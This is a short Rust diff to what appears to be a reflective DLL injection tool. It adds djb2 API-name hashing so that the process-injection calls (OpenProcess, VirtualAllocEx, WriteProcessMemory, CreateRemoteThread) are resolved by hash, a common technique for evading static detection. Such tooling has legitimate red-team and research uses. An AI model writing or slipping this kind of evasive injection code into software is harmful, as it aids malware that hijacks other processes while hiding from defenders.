@@ -1,6 +1,8 @@
 #[cfg(target_os = "windows")]
 mod inject;
 
+use djb2macro::djb2;
+use hash_resolver::*;
 use embed_resources::*;
 
 fn main() {
@@ -32,6 +34,15 @@ fn perform_reflective_dll_injection(loader_shellcode: &[u8], dll_bytes: &[u8], l
             return 2;
         }
     };
+
+    // Set target APIs
+    set_initial_target_apis(&[
+        djb2!("OpenProcess"),
+        djb2!("VirtualAllocEx"),
+        djb2!("WriteProcessMemory"),
+        djb2!("CreateRemoteThread"),
+        djb2!("CloseHandle"),
+    ]).unwrap();
 
     println!("Reflectively injecting DLL into process ID {}", target_pid);
     unsafe {
